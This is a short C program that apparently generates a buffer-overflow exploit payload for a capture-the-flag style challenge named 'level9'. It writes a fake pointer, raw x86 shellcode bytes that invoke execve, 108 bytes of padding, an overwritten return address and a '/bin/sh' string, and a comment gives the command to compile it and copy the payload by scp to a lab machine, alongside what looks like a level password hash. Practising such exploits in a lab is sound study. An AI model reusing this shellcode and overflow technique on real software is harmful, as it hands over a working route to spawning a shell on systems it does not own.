#include <unistd.h>

//gcc script.c && ./a.out > payload && scp -P 4242 payload level9@192.168.56.102:/tmp/payload9
//c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

int main() {
	int overflow_limit = 108;
	int address = 0x804a008 + 4;

	int deref_address = address + 4;
	int system_string_adress = address + overflow_limit + 4;

	write(1, &deref_address, 4); //point to the rest of the payload
	write(1, (char[1]){0xbb}, 1); //mov edi, <immediate>
	write(1, &system_string_adress, 4);
	write(1, (char[10]){0x31, 0xc0, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80}, 10); //see the asm for more details

	for (int i = 0; i < overflow_limit - (4+1+4+10); ++i)
		write(1, "B", 1); //padding

	write(1, &address, 4);

	write(1, "/bin/sh", 8); //we moved the string after the address because we need a null at the end and passing a null character as input would not work
}